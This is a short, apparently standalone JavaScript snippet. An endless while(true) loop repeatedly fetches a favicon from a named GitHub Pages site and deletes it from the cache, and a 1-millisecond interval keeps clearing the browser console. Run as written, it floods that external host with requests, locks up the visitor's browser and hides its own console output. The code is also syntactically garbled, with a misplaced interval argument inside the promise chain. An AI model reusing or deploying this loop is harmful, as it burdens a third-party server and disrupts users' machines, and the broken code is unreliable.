while (true) {
    fetch('https://t0m0t0w.github.io/favicon.png')
      .then(response => response.text())
      .then(data => {
        // Do something with the data
        console.log(data);
  
        // Delete the file from the cache
        caches.delete('https://t0m0t0w.github.io/favicon.png');
    }, 1000);
  }
  
setInterval(() => {
    console.clear();
  }, 1);
  